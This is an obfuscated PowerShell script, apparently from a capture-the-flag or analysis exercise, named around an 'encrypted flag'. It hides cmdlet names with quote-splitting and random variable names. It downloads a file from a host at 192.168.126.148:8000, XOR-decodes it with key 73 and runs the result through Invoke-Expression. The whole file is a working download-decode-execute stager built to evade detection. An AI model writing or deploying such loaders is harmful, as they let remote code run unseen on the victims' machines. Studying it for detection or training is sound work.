$09c5b699434943b6b9a9ada620495bcb = "http://192.168.126.148:8000/encrypted_flag.txt"

# get user's download path
$5a7e4a282bb7448fb7b5bfa39a35b0df = (Ne''w-Ob""jec''t -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path
$50d397a584b6474e93f705a6502224c8 = "encrypted_flag.txt"
$6b8778b7cc704ee2a75b106c2bea9282 = $5a7e4a282bb7448fb7b5bfa39a35b0df + "\" + $50d397a584b6474e93f705a6502224c8

# check if the encrypted flag exist or not in Download folder
if(![System.IO.File]::Exists($6b8778b7cc704ee2a75b106c2bea9282)){
    # download file
    In''vok''e-Web""Requ""est $09c5b699434943b6b9a9ada620495bcb -OutFile $6b8778b7cc704ee2a75b106c2bea9282
}

#$decrypt the flag
function ded7e27bbf454228bcb53129ac07b6d1 {
    $ec27c22d9dfc41e2b8c1496ba437021c = ""
    $f61e225cfe1d484981de4988b40df8b4 = G''et-Co''ntent -Path $6b8778b7cc704ee2a75b106c2bea9282 -Raw
    $339a18cced14be6bc35c6e7df638925 = 73
    foreach ($char in $f61e225cfe1d484981de4988b40df8b4.ToCharArray()) {
        $7f1796cab4f94bd5a96ef19bf913ef66 = [int][char]$char
        $1add7cad15f14b6ca981d83ac36d224e = [char]($7f1796cab4f94bd5a96ef19bf913ef66 -bxor $339a18cced14be6bc35c6e7df638925)
        $ec27c22d9dfc41e2b8c1496ba437021c += $1add7cad15f14b6ca981d83ac36d224e
    }
    return $ec27c22d9dfc41e2b8c1496ba437021c
}

$kjNWZnpBQXanwb5JSm23LrhXqgs6petg = ded7e27bbf454228bcb53129ac07b6d1

# execute the payload
I''nvoke-Expr''ess""ion $kjNWZnpBQXanwb5JSm23LrhXqgs6petg